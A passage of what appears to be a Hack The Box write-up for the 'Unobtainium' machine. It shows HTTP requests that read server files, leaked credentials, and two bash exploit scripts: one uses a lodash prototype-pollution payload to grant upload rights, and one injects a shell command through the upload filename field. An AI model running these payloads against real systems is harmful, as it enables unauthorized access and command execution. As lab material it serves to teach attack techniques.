class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>responese:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 500 Internal Server Error</span><br><span class="line"></span><br><span class="line">X-Powered-By: Express</span><br><span class="line"></span><br><span class="line">Content-Security-Policy: default-src <span class="string">&#x27;self&#x27;</span></span><br><span class="line"></span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 922</span><br><span class="line"></span><br><span class="line">Date: Fri, 23 Apr 2021 06:10:17 GMT</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;Error: ENOENT: no such file or directory, open&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at Object.openSync (fs.js:476:3)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at Object.readFileSync (fs.js:377:35)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at /usr/src/app/index.js:86:41&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at Array.forEach (&amp;lt;anonymous&amp;gt;)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at /usr/src/app/index.js:84:36&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt;</span><br><span class="line">&amp;nbsp; &amp;nbsp;at /usr/src/app/node_modules/express/lib/router/index.js:281:22&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>It’s said No such file or directory found because we don’t give any filename and we also see a interesting file called index.js.</p>
+<p>Let’s add index.js inside filename.</p>
+<p>request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /todo HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: unobtainium.htb:31337</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 73</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;auth&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;felamos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Winter2021&quot;</span>&#125;,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;index.js&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>responese:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">X-Powered-By: Express</span><br><span class="line"></span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 3655</span><br><span class="line"></span><br><span class="line">ETag: W/<span class="string">&quot;e47-um36vrYJPOpeanAA6s8aoKWsrsA&quot;</span></span><br><span class="line"></span><br><span class="line">Date: Fri, 23 Apr 2021 06:14:16 GMT</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ok&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;var root = require(\&quot;google-cloudstorage-commands\&quot;);\nconst express = require(&#x27;express&#x27;);\nconst &#123; exec &#125; = require(\&quot;child_process\&quot;);     \nconst bodyParser = require(&#x27;body-parser&#x27;);     \nconst _ = require(&#x27;lodash&#x27;);                                                                  \nconst app = express();\nvar fs = require(&#x27;fs&#x27;);\n                                                                                              \nconst users = [                                                                               \n  &#123;name: &#x27;felamos&#x27;, password: &#x27;Winter2021&#x27;&#125;,\n  &#123;name: &#x27;admin&#x27;, password: Math.random().toString(32), canDelete: true, canUpload: true&#125;,      \n];\n\nlet messages = [];                             \nlet lastId = 1;                                \n                                                                                              \nfunction findUser(auth) &#123;                                                                     \n  return users.find((u) =&gt;                                                                    \n    u.name === auth.name &amp;&amp;                                                                   \n    u.password === auth.password);                                                            \n&#125;                                    \n                                               \napp.use(bodyParser.json());                                                                   \n                                               \napp.get(&#x27;/&#x27;, (req, res) =&gt; &#123;                   \n  res.send(messages);                                                                         \n&#125;);                                                                                           \n                                                                                              \napp.put(&#x27;/&#x27;, (req, res) =&gt; &#123;   \n  const user = findUser(req.body.auth || &#123;&#125;);                                                 \n                                               \n  if (!user) &#123;                                 \n    res.status(403).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);                                \n    return;\n  &#125;\n\n  const message = &#123;\n    icon: &#x27;__&#x27;,\n  &#125;;\n\n  _.merge(message, req.body.message, &#123;\n    id: lastId++,\n    timestamp: Date.now(),\n    userName: user.name,\n  &#125;);\n\n  messages.push(message);\n  res.send(&#123;ok: true&#125;);\n&#125;);\n\napp.delete(&#x27;/&#x27;, (req, res) =&gt; &#123;\n  const user = findUser(req.body.auth || &#123;&#125;);\n\n  if (!user || !user.canDelete) &#123;\n    res.status(403).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);\n    return;\n  &#125;\n\n  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\n  res.send(&#123;ok: true&#125;);\n&#125;);\napp.post(&#x27;/upload&#x27;, (req, res) =&gt; &#123;\n  const user = findUser(req.body.auth || &#123;&#125;);\n  if (!user || !user.canUpload) &#123;\n    res.status(403).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);\n    return;\n  &#125;\n\n\n  filename = req.body.filename;\n  root.upload(\&quot;./\&quot;,filename, true);\n  res.send(&#123;ok: true, Uploaded_File: filename&#125;);\n&#125;);\n\napp.post(&#x27;/todo&#x27;, (req, res) =&gt; &#123;\n\tconst user = findUser(req.body.auth || &#123;&#125;);\n\tif (!user) &#123;\n\t\tres.status(403).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);\n\t\treturn;\n\t&#125;\n\n\tfilename = req.body.filename;\n        testFolder = \&quot;/usr/src/app\&quot;;\n        fs.readdirSync(testFolder).forEach(file =&gt; &#123;\n                if (file.indexOf(filename) &gt; -1) &#123;\n                        var buffer = fs.readFileSync(filename).toString();\n                        res.send(&#123;ok: true, content: buffer&#125;);\n                &#125;\n        &#125;);\n&#125;);\n\napp.listen(3000);\nconsole.log(&#x27;Listening on port 3000...&#x27;);\n&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We got the index.js but it in bad format.</p>
+<p>After Beautify the file we got this.</p>
+<ul>
+<li>Index.js</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">var root = require(<span class="string">&quot;google-cloudstorage-commands&quot;</span>);</span><br><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const &#123; <span class="built_in">exec</span> &#125; = require(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line">const bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line">const _ = require(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line">const app = express();</span><br><span class="line">var fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const <span class="built_in">users</span> = [</span><br><span class="line"> &#123;name: <span class="string">&#x27;felamos&#x27;</span>, password: <span class="string">&#x27;Winter2021&#x27;</span>&#125;,</span><br><span class="line"> &#123;name: <span class="string">&#x27;admin&#x27;</span>, password: Math.random().toString(32), canDelete: <span class="literal">true</span>, canUpload: <span class="literal">true</span>&#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="built_in">let</span> messages = [];</span><br><span class="line"><span class="built_in">let</span> lastId = 1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> findUser(auth) &#123;</span><br><span class="line"> <span class="built_in">return</span> users.find((u) =&gt;</span><br><span class="line"> u.name === auth.name &amp;&amp;</span><br><span class="line"> u.password === auth.password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line"> res.send(messages);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.put(<span class="string">&#x27;/&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line"> const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!user) &#123;</span><br><span class="line"> res.status(403).send(&#123;ok: <span class="literal">false</span>, error: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line"> <span class="built_in">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> const message = &#123;</span><br><span class="line"> icon: <span class="string">&#x27;__&#x27;</span>,</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> _.merge(message, req.body.message, &#123;</span><br><span class="line"> <span class="built_in">id</span>: lastId++,</span><br><span class="line"> timestamp: Date.now(),</span><br><span class="line"> userName: user.name,</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> messages.push(message);</span><br><span class="line"> res.send(&#123;ok: <span class="literal">true</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.delete(<span class="string">&#x27;/&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line"> const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!user || !user.canDelete) &#123;</span><br><span class="line"> res.status(403).send(&#123;ok: <span class="literal">false</span>, error: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line"> <span class="built_in">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> messages = messages.filter((m) =&gt; m.id !== req.body.messageId);</span><br><span class="line"> res.send(&#123;ok: true&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.post(&#x27;/upload&#x27;, (req, res) =&gt; &#123;</span><br><span class="line"> const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line"> if (!user || !user.canUpload) &#123;</span><br><span class="line"> res.status(<span class="number">403</span>).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);</span><br><span class="line"> return;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> filename = req.body.filename;</span><br><span class="line"> root.upload(&quot;./&quot;,filename, true);</span><br><span class="line"> res.send(&#123;ok: true, Uploaded_File: filename&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/todo&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">        const user = findUser(req.body.auth || &#123;&#125;);</span><br><span class="line">        if (!user) &#123;</span><br><span class="line">                res.status(<span class="number">403</span>).send(&#123;ok: false, error: &#x27;Access denied&#x27;&#125;);</span><br><span class="line">                return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filename = req.body.filename;</span><br><span class="line"> testFolder = &quot;/usr/src/app&quot;;</span><br><span class="line"> fs.readdirSync(testFolder).forEach(file =&gt; &#123;</span><br><span class="line"> if (file.indexOf(filename) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line"> var buffer = fs.readFileSync(filename).toString();</span><br><span class="line"> res.send(&#123;ok: true, content: buffer&#125;);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br><span class="line">console.log(&#x27;Listening on port <span class="number">3000</span>...&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>After reading the file i found nothing interesting but i am sure that it’s using react or nodejs or something like that if the server uses that so there is a file called package.json which has the list of npm packages used and we also find vulnerability for that specific packages.</p>
+<p>request:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /todo HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: unobtainium.htb:31337</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 77</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;auth&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;felamos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Winter2021&quot;</span>&#125;,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;package.json&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>responese:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">X-Powered-By: Express</span><br><span class="line"></span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 487</span><br><span class="line"></span><br><span class="line">ETag: W/<span class="string">&quot;1e7-nNVooCaQU8RTLCaxUyITOmGY9A8&quot;</span></span><br><span class="line"></span><br><span class="line">Date: Fri, 23 Apr 2021 06:21:02 GMT</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ok&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;&#123;\n  \&quot;name\&quot;: \&quot;Unobtainium-Server\&quot;,\n  \&quot;version\&quot;: \&quot;1.0.0\&quot;,\n  \&quot;description\&quot;: \&quot;API Service for Electron client\&quot;,\n  \&quot;main\&quot;: \&quot;index.js\&quot;,\n  \&quot;scripts\&quot;: &#123;\n    \&quot;start\&quot;: \&quot;node index.js\&quot;\n  &#125;,\n  \&quot;author\&quot;: \&quot;felamos\&quot;,\n  \&quot;license\&quot;: \&quot;ISC\&quot;,\n  \&quot;dependencies\&quot;: &#123;\n    \&quot;body-parser\&quot;: \&quot;1.18.3\&quot;,\n    \&quot;express\&quot;: \&quot;4.16.4\&quot;,\n    \&quot;lodash\&quot;: \&quot;4.17.4\&quot;,\n    \&quot;google-cloudstorage-commands\&quot;: \&quot;0.0.1\&quot;\n  &#125;,\n  \&quot;devDependencies\&quot;: &#123;&#125;\n&#125;\n&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>After beautify the package.json and we got this</p>
+<ul>
+<li>package.json</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Unobtainium-Server&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;API Service for Electron client&quot;</span>,</span><br><span class="line">  <span class="string">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;node index.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;author&quot;</span>: <span class="string">&quot;felamos&quot;</span>,</span><br><span class="line">  <span class="string">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;body-parser&quot;</span>: <span class="string">&quot;1.18.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;express&quot;</span>: <span class="string">&quot;4.16.4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lodash&quot;</span>: <span class="string">&quot;4.17.4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;google-cloudstorage-commands&quot;</span>: <span class="string">&quot;0.0.1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;devDependencies&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1MT0RBU0gtNzM2Mzg=">Prototype Pollution<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1HT09HTEVDTE9VRFNUT1JBR0VDT01NQU5EUy0xMDUwNDMx">Command Injection<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>With the help of Lodash -&gt; Prototype Pollution we give ourself a permission of upload &amp; delete with changing canDelete and canUpload to be True.</p>
+<p>And with help of google-cloudstorage-commands -&gt; Command Injection We can execute commands on server.</p>
+<p>So let’s first give ourself a permission to upload file and delete files</p>
+<p>For that i create a script to keep things simple.</p>
+<ul>
+<li>Exploit.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RHOST=<span class="string">&quot;unobtainium.htb&quot;</span></span><br><span class="line">RPORT=31337</span><br><span class="line">UA=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span></span><br><span class="line">PROXY=<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">TEXT=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> - &lt;&lt;<span class="string">EOF &gt; message.json</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;auth&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;:&quot;felamos&quot;,</span></span><br><span class="line"><span class="string">        &quot;password&quot;:&quot;Winter2021&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;message&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;text&quot;:$&#123;TEXT&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -X PUT \</span><br><span class="line">     -A <span class="string">&quot;<span class="variable">$&#123;UA&#125;</span>&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;<span class="subst">$(cat message.json | jq -c)</span>&quot;</span> \</span><br><span class="line">     -x <span class="string">&quot;<span class="variable">$&#123;PROXY&#125;</span>&quot;</span> \</span><br><span class="line">     <span class="string">&quot;http://<span class="variable">$&#123;RHOST&#125;</span>:<span class="variable">$&#123;RPORT&#125;</span>/&quot;</span> \</span><br><span class="line">| jq .</span><br></pre></td></tr></table></figure>
+
+<p>Let’s run the exploit</p>
+<p>Imp -&gt; before running the exploit intercept the request and forward the req becuase we use proxy inside exploit.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># chmod +x Exploit.sh</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># ./Exploit.sh &#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;canDelete&quot;:true, &quot;canUpload&quot;:true&#125;&#125;&#125;&#x27;                                                             </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;ok&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>It’s responce is true means now we have the permission.</p>
+<p>Let’s check we can write in a file or not.</p>
+<p>I create another one exploit to write in a file.</p>
+<ul>
+<li>exploit_stage2.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RHOST=<span class="string">&quot;unobtainium.htb&quot;</span></span><br><span class="line">RPORT=31337</span><br><span class="line">UA=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span></span><br><span class="line">PROXY=<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">FILE=<span class="string">&quot;&amp; echo dedsec | tee dedsec.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> - &lt;&lt;<span class="string">EOF &gt; message.json</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;auth&quot;:</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;:&quot;felamos&quot;,</span></span><br><span class="line"><span class="string">        &quot;password&quot;:&quot;Winter2021&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;filename&quot;:&quot;$&#123;FILE&#125;&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -A <span class="string">&quot;<span class="variable">$&#123;UA&#125;</span>&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&quot;<span class="subst">$(cat message.json | jq -c)</span>&quot;</span> \</span><br><span class="line">     -x <span class="string">&quot;<span class="variable">$&#123;PROXY&#125;</span>&quot;</span> \</span><br><span class="line">     -o /dev/null \</span><br><span class="line">     <span class="string">&quot;http://<span class="variable">$&#123;RHOST&#125;</span>:<span class="variable">$&#123;RPORT&#125;</span>/upload&quot;</span></span><br></pre></td></tr></table></figure>
+
